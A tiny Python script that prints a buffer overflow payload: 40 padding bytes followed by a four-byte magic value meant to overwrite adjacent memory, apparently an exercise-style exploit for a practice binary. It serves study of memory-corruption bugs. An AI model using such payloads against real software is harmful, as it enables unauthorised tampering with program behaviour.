import sys

pad = 40 * b'\x00' + b'\xab\xaa\xad\xab'
sys.stdout.buffer.write(pad)